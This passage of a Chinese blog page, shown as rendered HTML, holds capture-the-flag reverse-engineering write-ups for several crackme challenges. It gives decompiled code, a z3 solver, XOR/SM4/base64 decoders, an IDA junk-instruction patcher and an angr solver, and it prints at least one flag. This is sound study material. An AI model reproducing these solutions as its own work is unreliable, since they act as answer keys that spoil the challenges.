class="number">36</span>]+l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">1</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">10</span>]-l[<span class="number">33</span>]+l[<span class="number">5</span>]-l[<span class="number">27</span>]-l[<span class="number">23</span>]-l[<span class="number">24</span>]-l[<span class="number">7</span>]+l[<span class="number">31</span>]-l[<span class="number">28</span>]-l[<span class="number">18</span>]+l[<span class="number">6</span>]==-<span class="number">1236</span>)</span><br><span class="line">s.add(l[<span class="number">20</span>]+l[<span class="number">27</span>]-l[<span class="number">29</span>]-l[<span class="number">25</span>]-l[<span class="number">3</span>]+l[<span class="number">28</span>]-l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">10</span>]+l[<span class="number">31</span>]+l[<span class="number">16</span>]+l[<span class="number">21</span>]-l[<span class="number">7</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]+l[<span class="number">12</span>]-l[<span class="number">37</span>]+l[<span class="number">6</span>]+l[<span class="number">23</span>]+l[<span class="number">41</span>]-l[<span class="number">39</span>]-l[<span class="number">38</span>]+l[<span class="number">40</span>]-l[<span class="number">36</span>]+l[<span class="number">8</span>]-l[<span class="number">9</span>]-l[<span class="number">5</span>]-l[<span class="number">1</span>]-l[<span class="number">13</span>]-l[<span class="number">14</span>]+l[<span class="number">19</span>]+l[<span class="number">0</span>]-l[<span class="number">34</span>]-l[<span class="number">15</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]==-<span class="number">114</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">28</span>]-l[<span class="number">13</span>]-l[<span class="number">23</span>]-l[<span class="number">33</span>]+l[<span class="number">18</span>]+l[<span class="number">10</span>]+l[<span class="number">11</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">16</span>]+l[<span class="number">39</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">6</span>]+l[<span class="number">7</span>]+l[<span class="number">31</span>]+l[<span class="number">5</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">15</span>]-l[<span class="number">24</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">35</span>]-l[<span class="number">9</span>]+l[<span class="number">30</span>]+l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">8</span>]-l[<span class="number">14</span>]+l[<span class="number">26</span>]+l[<span class="number">21</span>]==<span class="number">659</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]-l[<span class="number">3</span>]+l[<span class="number">7</span>]-l[<span class="number">27</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]-l[<span class="number">24</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]+l[<span class="number">20</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">1</span>]+l[<span class="number">15</span>]+l[<span class="number">41</span>]+l[<span class="number">12</span>]+l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">17</span>]-l[<span class="number">39</span>]+l[<span class="number">19</span>]-l[<span class="number">13</span>]+l[<span class="number">23</span>]+l[<span class="number">18</span>]-l[<span class="number">2</span>]+l[<span class="number">6</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">28</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">10</span>]-l[<span class="number">14</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]-l[<span class="number">11</span>]==-<span class="number">430</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]-l[<span class="number">23</span>]-l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">17</span>]+l[<span class="number">38</span>]-l[<span class="number">36</span>]-l[<span class="number">22</span>]-l[<span class="number">10</span>]+l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">4</span>]+l[<span class="number">5</span>]+l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]-l[<span class="number">28</span>]+l[<span class="number">3</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">33</span>]+l[<span class="number">13</span>]-l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]-l[<span class="number">20</span>]-l[<span class="number">41</span>]-l[<span class="number">30</span>]-l[<span class="number">12</span>]-l[<span class="number">7</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">18</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]==-<span class="number">513</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">30</span>]+l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">37</span>]-l[<span class="number">15</span>]-l[<span class="number">18</span>]+l[<span class="number">7</span>]+l[<span class="number">25</span>]-l[<span class="number">14</span>]+l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">16</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">39</span>]-l[<span class="number">22</span>]+l[<span class="number">23</span>]-l[<span class="number">36</span>]-l[<span class="number">27</span>]-l[<span class="number">9</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]-l[<span class="number">0</span>]-l[<span class="number">31</span>]-l[<span class="number">20</span>]+l[<span class="number">12</span>]-l[<span class="number">8</span>]+l[<span class="number">29</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">21</span>]==-<span class="number">502</span>)</span><br><span class="line">s.add(l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">9</span>]-l[<span class="number">40</span>]-l[<span class="number">33</span>]+l[<span class="number">25</span>]+l[<span class="number">39</span>]-l[<span class="number">26</span>]+l[<span class="number">23</span>]-l[<span class="number">0</span>]-l[<span class="number">29</span>]-l[<span class="number">32</span>]-l[<span class="number">4</span>]+l[<span class="number">37</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">17</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">5</span>]+l[<span class="number">8</span>]+l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">19</span>]+l[<span class="number">12</span>]+l[<span class="number">20</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">15</span>]-l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">14</span>]==<span class="number">853</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">36</span>]-l[<span class="number">30</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]+l[<span class="number">5</span>]-l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">0</span>]-l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]+l[<span class="number">32</span>]+l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">18</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">13</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">35</span>]-l[<span class="number">26</span>]+l[<span class="number">27</span>]==-<span class="number">28</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">14</span>]-l[<span class="number">33</span>]+l[<span class="number">7</span>]-l[<span class="number">23</span>]-l[<span class="number">25</span>]+l[<span class="number">0</span>]-l[<span class="number">6</span>]-l[<span class="number">21</span>]-l[<span class="number">16</span>]+l[<span class="number">17</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]-l[<span class="number">37</span>]+l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">22</span>]-l[<span class="number">35</span>]-l[<span class="number">10</span>]-l[<span class="number">31</span>]-l[<span class="number">2</span>]+l[<span class="number">41</span>]-l[<span class="number">1</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]-l[<span class="number">34</span>]+l[<span class="number">39</span>]+l[<span class="number">40</span>]+l[<span class="number">32</span>]-l[<span class="number">5</span>]+l[<span class="number">36</span>]-l[<span class="number">27</span>]==-<span class="number">529</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]+l[<span class="number">8</span>]+l[<span class="number">36</span>]+l[<span class="number">35</span>]-l[<span class="number">23</span>]-l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]-l[<span class="number">27</span>]-l[<span class="number">24</span>]+l[<span class="number">26</span>]+l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]-l[<span class="number">2</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">10</span>]-l[<span class="number">17</span>]+l[<span class="number">3</span>]+l[<span class="number">19</span>]+l[<span class="number">22</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]+l[<span class="number">37</span>]+l[<span class="number">16</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">21</span>]-l[<span class="number">12</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]==-<span class="number">12</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">3</span>]+l[<span class="number">26</span>]-l[<span class="number">12</span>]+l[<span class="number">8</span>]-l[<span class="number">35</span>]-l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]+l[<span class="number">13</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]-l[<span class="number">21</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">29</span>]-l[<span class="number">10</span>]-l[<span class="number">38</span>]+l[<span class="number">22</span>]+l[<span class="number">37</span>]+l[<span class="number">5</span>]+l[<span class="number">19</span>]+l[<span class="number">7</span>]+l[<span class="number">16</span>]-l[<span class="number">31</span>] == <span class="number">81</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2a</span>):</span><br><span class="line">        flag += <span class="built_in">bytes</span>([m[l[i]].as_long()])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="2019红帽杯-childRE"><a href="#2019红帽杯-childRE" class="headerlink" title="[2019红帽杯]childRE"></a>[2019红帽杯]childRE</h3><p><a href="https://lantern.cool/wp-games-2019redhat/">2019 红帽杯 | Lantern’s 小站</a></p><h3 id="SWPU2019-ReverseMe"><a href="#SWPU2019-ReverseMe" class="headerlink" title="[SWPU2019]ReverseMe"></a>[SWPU2019]ReverseMe</h3><p>先与<code>SWPU_2019_CTF</code>异或</p><p>后进入encode函数，相当复杂，但实际跟进去也是个异或，动调提取xor数据以及最终对比数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xor_data1 = <span class="string">b&quot;SWPU_2019_CTF&quot;</span></span><br><span class="line">xor_data2 = [<span class="number">0x86</span>, <span class="number">0x0C</span>, <span class="number">0x3E</span>, <span class="number">0xCA</span>, <span class="number">0x98</span>, <span class="number">0xD7</span>, <span class="number">0xAE</span>, <span class="number">0x19</span>, <span class="number">0xE2</span>, <span class="number">0x77</span>, <span class="number">0x6B</span>, <span class="number">0xA6</span>, <span class="number">0x6A</span>, <span class="number">0xA1</span>, <span class="number">0x77</span>, <span class="number">0xB0</span>, <span class="number">0x69</span>, <span class="number">0x91</span>, <span class="number">0x37</span>, <span class="number">0x05</span>, <span class="number">0x7A</span>, <span class="number">0xF9</span>, <span class="number">0x7B</span>, <span class="number">0x30</span>, <span class="number">0x43</span>, <span class="number">0x5A</span>, <span class="number">0x4B</span>, <span class="number">0x10</span>, <span class="number">0x86</span>, <span class="number">0x7D</span>, <span class="number">0xD4</span>, <span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line">data = [<span class="number">0xB3</span>, <span class="number">0x37</span>, <span class="number">0x0F</span>, <span class="number">0xF8</span>, <span class="number">0xBC</span>, <span class="number">0xBC</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xBA</span>, <span class="number">0x5A</span>, <span class="number">0x4D</span>, <span class="number">0x86</span>, <span class="number">0x44</span>, <span class="number">0x97</span>, <span class="number">0x62</span>, <span class="number">0xD3</span>, <span class="number">0x4F</span>, <span class="number">0xBA</span>, <span class="number">0x24</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x9F</span>, <span class="number">0x72</span>, <span class="number">0x1A</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x6D</span>, <span class="number">0x26</span>, <span class="number">0xBA</span>, <span class="number">0x6B</span>, <span class="number">0xC8</span>, <span class="number">0x67</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data[i] ^= xor_data2[i]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([data[i] ^ xor_data1[i % <span class="built_in">len</span>(xor_data1)]])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-crackMe"><a href="#安洵杯-2019-crackMe" class="headerlink" title="[安洵杯_2019]crackMe"></a>[安洵杯_2019]crackMe</h3><p>通过SEH, VEH异常处理进行加密、编码</p><p>通过查看交叉引用可知整个流程为</p><p>输入flag后，进行base64table变换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __stdcall sub_D02AB0(int a1, int a2, int a3, int a4)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D8h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt; j_strlen(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( Str[i] &lt;= &#x27;z&#x27; &amp;&amp; Str[i] &gt;= &#x27;a&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] -= 32;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( Str[i] &lt;= &#x27;Z&#x27; &amp;&amp; Str[i] &gt;= &#x27;A&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] += 32;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  MessageBoxA(0, &quot;hooked&quot;, &quot;successed&quot;, 0);</span><br><span class="line">  AddVectoredExceptionHandler(0, Handler);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进行Handler中的SM4解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __stdcall Handler_0(_DWORD **a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v2[20]; // [esp+D0h] [ebp-18h] BYREF</span><br><span class="line"></span><br><span class="line">  if ( **a1 == 0xC0000005 )</span><br><span class="line">  &#123;</span><br><span class="line">    qmemcpy(v2, &quot;where_are_u_now?&quot;, 16);</span><br><span class="line">    sub_D01172((int)&amp;unk_D0A218, (int)v2);</span><br><span class="line">    SetUnhandledExceptionFilter(TopLevelExceptionFilter);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后将最终对比的数据进行处理, 然后变种base64处理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl sub_D02C30(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  char v2; // [esp+D3h] [ebp-11h]</span><br><span class="line">  size_t i; // [esp+DCh] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  result = (int)a1;</span><br><span class="line">  if ( *(_DWORD *)*a1 == 0xC0000005 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt; j_strlen(Str2); i += 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = Str2[i];</span><br><span class="line">      Str2[i] = Str2[i + 1];</span><br><span class="line">      Str2[i + 1] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">    Str1 = variantbase64encode(byte_D0A180);</span><br><span class="line">    *(_DWORD *)(a1[1] + 176) = *(_DWORD *)(*a1 + 20);</span><br><span class="line">    *(_DWORD *)(a1[1] + 164) = *(_DWORD *)(*a1 + 24);</span><br><span class="line">    *(_DWORD *)(a1[1] + 172) = *(_DWORD *)(*a1 + 28);</span><br><span class="line">    *(_DWORD *)(a1[1] + 168) = *(_DWORD *)(*a1 + 32);</span><br><span class="line">    *(_DWORD *)(a1[1] + 156) = *(_DWORD *)(*a1 + 36);</span><br><span class="line">    *(_DWORD *)(a1[1] + 160) = *(_DWORD *)(*a1 + 40);</span><br><span class="line">    *(_DWORD *)(a1[1] + 184) = sub_D01136;</span><br><span class="line">    result = -1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变种位置在<code>=变！</code>， 以及整个表的右移24</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211003151707570.png" alt="image-20211003151707570"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_D02760</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (a1 + <span class="number">0x18</span>) % <span class="number">64</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则解密如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">new_table = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">if</span> <span class="number">97</span> &lt;= i &lt;= <span class="number">122</span>:</span><br><span class="line">        new_table += <span class="built_in">bytes</span>([i - <span class="number">32</span>])</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">65</span> &lt;= i &lt;= <span class="number">90</span>:</span><br><span class="line">        new_table += <span class="built_in">bytes</span>([i + <span class="number">32</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_table += <span class="built_in">bytes</span>([i])</span><br><span class="line"></span><br><span class="line">new_table = <span class="built_in">list</span>(new_table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">    new_table.insert(<span class="built_in">len</span>(new_table), new_table[<span class="number">0</span>])</span><br><span class="line">    new_table.remove(new_table[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">new_table = <span class="built_in">bytes</span>(new_table)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="string">&quot;1UTAOIkpyOSWGv/mOYFY4R!!&quot;</span>.replace(<span class="string">&quot;!&quot;</span>, <span class="string">&quot;=&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    s[i], s[i+<span class="number">1</span>] = s[i+<span class="number">1</span>], s[i]</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span>.join(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">s = s.translate(<span class="built_in">bytes</span>.maketrans(new_table, table))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = base64.b64decode(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line">key = <span class="string">b&quot;where_are_u_now?&quot;</span></span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">cipher = bytes_to_long(cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> decrypt</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(decrypt(cipher, key)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="CFI-CTF-2018-IntroToPE"><a href="#CFI-CTF-2018-IntroToPE" class="headerlink" title="[CFI-CTF 2018]IntroToPE"></a>[CFI-CTF 2018]IntroToPE</h3><p>.Net 用 dnspy ， base64直接解‘</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211003154437068.png" alt="image-20211003154437068"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  tmp bpython3</span><br><span class="line">bpython version 0.20 on top of Python 3.6.9 /usr/local/bin/python3</span><br><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64decode(b&quot;Q0ZJey5OZXRDI18xc19AdzNzMG0zfQ==&quot;)</span><br><span class="line">b&#x27;CFI&#123;.NetC#_1s_@w3s0m3&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="羊城杯-2020-easyre"><a href="#羊城杯-2020-easyre" class="headerlink" title="[羊城杯 2020]easyre"></a>[羊城杯 2020]easyre</h3><p>三部分, encode_one为base64, encode_tow换个位置，encode_three凯撒密码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_one</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_tow</span>(<span class="params">s</span>):</span></span><br><span class="line">    _s = [<span class="number">0</span>] * <span class="built_in">len</span>(s)</span><br><span class="line">    _s[<span class="number">26</span>:<span class="number">39</span>] = s[:<span class="number">13</span>]</span><br><span class="line">    _s[:<span class="number">13</span>] = s[<span class="number">13</span>:<span class="number">26</span>]</span><br><span class="line">    _s[<span class="number">39</span>:<span class="number">39</span>+<span class="number">13</span>] = s[<span class="number">26</span>:<span class="number">26</span>+<span class="number">13</span>]</span><br><span class="line">    _s[<span class="number">13</span>:<span class="number">13</span>+<span class="number">13</span>] = s[<span class="number">39</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(_s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_tree</span>(<span class="params">s</span>):</span></span><br><span class="line">    _s = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0x30</span> &lt;= i &lt;= <span class="number">0x39</span>:</span><br><span class="line">            _s += <span class="built_in">bytes</span>([(i - <span class="number">0x30</span> - <span class="number">3</span>) % <span class="number">10</span> + <span class="number">0x30</span>])</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">0x61</span> &lt;= i &lt;= <span class="number">0x7A</span>:</span><br><span class="line">            _s += <span class="built_in">bytes</span>([(i - <span class="number">0x61</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="number">0x61</span>])</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">0x41</span> &lt;= i &lt;= <span class="number">0x41</span> + <span class="number">25</span>:</span><br><span class="line">            _s += <span class="built_in">bytes</span>([(i - <span class="number">0x41</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="number">0x41</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            _s += <span class="built_in">bytes</span>([i])</span><br><span class="line">    <span class="keyword">return</span> _s</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;</span></span><br><span class="line">s = decode_tree(s)</span><br><span class="line">s = decode_tow(s)</span><br><span class="line">s = decode_one(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-funnyre"><a href="#WUSTCTF2020-funnyre" class="headerlink" title="[WUSTCTF2020]funnyre"></a>[WUSTCTF2020]funnyre</h3><p>花指令直接拿脚本去掉</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bg = <span class="number">0x00000000004005B0</span></span><br><span class="line">end = <span class="number">0x0000000000402584</span></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        patch_byte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin=begin+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+get_item_size(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(addr&lt;end):</span><br><span class="line">    <span class="built_in">next</span> =next_instr(addr)</span><br><span class="line">    create_insn(<span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> print_insn_mnem(addr) <span class="keyword">and</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> print_insn_mnem(<span class="built_in">next</span>) :</span><br><span class="line">        <span class="keyword">if</span> get_operand_value(addr, <span class="number">0</span>) == get_operand_value(<span class="built_in">next</span>, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;jmp %08x&#x27;</span>%addr)</span><br><span class="line">            dest_addr = get_operand_value(addr, <span class="number">0</span>)</span><br><span class="line">            patch_nop(addr, dest_addr)</span><br><span class="line">            addr=dest_addr</span><br><span class="line">            create_insn(addr)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    create_insn(addr)</span><br></pre></td></tr></table></figure><p>apply patch后打开发现是简单运算后对比, 直接angr暴力解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./funnyre&quot;</span>, load_options=&#123;<span class="string">&quot;auto_load_libs&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">f = p.factory</span><br><span class="line">state = f.entry_state(addr=<span class="number">0x400605</span>)</span><br><span class="line">flag = claripy.BVS(<span class="string">&quot;flag&quot;</span>, <span class="number">8</span>*<span class="number">32</span>)</span><br><span class="line">state.memory.store(<span class="number">0x603055</span>+<span class="number">0x300</span>+<span class="number">5</span>, flag)</span><br><span class="line">state.regs.rdx = <span class="number">0x603055</span>+<span class="number">0x300</span></span><br><span class="line">state.regs.rdi = <span class="number">0x603055</span>+<span class="number">0x300</span>+<span class="number">5</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line">sm.explore(find=<span class="number">0x401DAE</span>)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] found!&quot;</span>)</span><br><span class="line">    x = sm.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(flag, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><h3 